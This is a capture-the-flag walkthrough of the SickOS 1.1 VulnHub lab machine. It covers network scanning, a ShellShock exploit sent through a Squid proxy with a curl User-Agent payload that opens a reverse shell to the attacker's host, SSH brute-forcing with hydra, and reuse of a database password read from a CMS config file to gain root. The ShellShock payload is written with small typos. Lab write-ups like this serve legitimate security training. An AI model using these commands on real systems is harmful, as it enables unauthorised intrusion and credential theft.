![Sickos 1.1 Walkthrough]({{ site.url }}/img/sickos1.1-walkthrough.png)

This is a walkthrough of [SickOS 1.1](sickos1.1-url) found on [VulnHub](vulnhub-url). The objective is to compromise the VM, gain
root priveleges, and find the flag. We need to treat this machine as a remote server, so we can't use any kernel tricks here.

After booting the virtual machine I needed to find the IP address of the box, so I did a simple ping sweep.

{% highlight bash %}
nmap -n -sP 172.16.49.0/24
{% endhighlight %}

![SickOS 1.1 Ping Sweep]({{ site.url }}/img/sickos1.1-ping-sweep.png)

The IP address of the SickOS 1.1 server is 172.16.149.133. I knew this because the Kali VM IP address is 172.16.149.132. Now
that I have the IP of the SickOS server I need to identify any open ports. Running a nmap scan of the host will give me the 
information I need to get started:

{% highlight bash %}
nmap -n -Pn -sS -p - 172.16.149.133
{% endhighlight %}

![SickOS 1.1 Nmap Scan]({{ site.url }}/img/sickos1.1-nmap-scan.png)

The results show that we have what looks like Squid Proxy Server open on port 3128 and SSH on port 22. Next I want to run a 
Nikto scan to look for any low hanging fruit. Be sure to use the "-useproxy" flag so the scan runs through the proxy.

{% highlight bash %}
nikto -h http://172.16.149.133 -useproxy 172.16.149.133:3128
{% endhighlight %}

![SickOS 1.1 Nikto Scan]({{ site.url}}/img/sick0s1.1-nikto-scan.png)

Some interesting results return from the Nikto scan. Here we can see that the "/cgi-bin/status" portion of the site is vulnerable
to ShellShock. We will use this an attack vector to exploit the server and gain access to the box. Open a second terminal window
and establish a netcat listener.

{% highlight bash %}
nc -lvnp 666
{% endhighlight %}

Now we exploit ShellShock using curl.
{%  highlight bash %}
curl -H "User-Agent: () { ;: }; /bin/bash -i >& /dev/tcp/172.16.149.132/666 0&>1" http://172.16.149.133/cgi-bin/status -x http://172.16.149.133:3128
{% endhighlight %}

After running the curl command, switch over to the terminal window that is running our Netcat listener. You should have been 
given a shell prompt.

Now that we have access on the box we need to gather some information. First I am going to check out the "/etc/passwd" file.

{%  highlight bash %}
cat /etc/passwd
{% endhighlight %}

![SickOS 1.1 /etc/passwd]({{ site.url }}/img/sickos1.1-etc-passwd.png)

In the results we see that an account exists with the username "sickos", a directory in "home", and that the user has shell access
on the box. Now I want to check out the "/etc/group" file for more information.

{%  highlight bash %}
cat /etc/group
{% endhighlight %}

![SickOS 1.1 /etc/group]({{ site.url }}/img/sickos1.1-etc-group.png)

The results show that the user "sickos" is part of the "adm" group. This is indicative of the user being able to use the sudo command to
access root. Armed with this info I am going to attempt bruteforce SSH to see if I can get the password. I figure I will let hydra
run while I poke around the box looking for any further useful information.

{% highlight bash %}
hydra -t 10 -l sickos -P /usr/share/wordlist/rockyou.txt -vV 172.16.149.133 ssh
{% endhighlight %}

I tried to get this started several times with no avail - looks like there might be something blocking it, so I am going to continue
gathering information on the box. Because this server is acting as a webserver; typically web files are hosted in "/var/www," so I am
going to change to the directory and list out all files.

{% highlight bash %}
cd /var/www/
ls
{% endhighlight %}

![SickOS 1.1 ls /var/www]({{ site.url.}}/img/sickos1.1-ls-var-www.png)

Here we see a directory called "wolfcms" - this contains the website and configuration files. Within the "wolfcms" dir there is a
file called "config.php." These config files typically have database usernames, passwords, and configuration settings for the 
website, so I am going to take a look.

{% highlight bash %}
cat config.php|head -20
{% endhighlight %}

![SickOS 1.1 config.php Contents]({{ site.url }}/img/sickos1.1-config.php-contents.png)

In the "config.php" is a database username and password. One thing about users' is they tend to use the same password everywhere,
so lets try using it with SSH and the "sickos" user. 

{% highlight bash %}
ssh sickos@172.16.149.133
{% endhighlight %}

The SSH username and pasword worked! Since we know "sickos" is in sudoes lets switch to "root" and see what is in the "/root"
directory.

{% highlight bash %}
sudo su -
# enter sickos password
ls
{% endhighlight %}

Inside the "/root" directory is the flag, cat the file out and we have completed the objective!
